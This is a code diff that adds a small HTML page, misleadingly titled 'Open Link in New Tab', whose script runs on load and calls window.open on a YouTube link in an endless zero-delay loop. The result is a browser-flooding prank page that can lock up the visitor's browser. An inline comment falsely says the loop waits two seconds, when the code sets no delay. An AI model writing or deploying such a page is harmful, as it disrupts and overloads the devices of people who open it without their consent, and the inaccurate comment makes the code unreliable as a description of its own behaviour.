@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Open Link in New Tab</title>
+    <script>
+        function openLoop() {
+            window.open('https://www.youtube.com/watch?v=xvFZjo5PgG0', '_blank');
+            setTimeout(openLoop, 0); // Opens a new tab every 2 seconds
+        }
+        window.onload = openLoop;
+    </script>
+</head>
+<body>
+</body>
+</html>
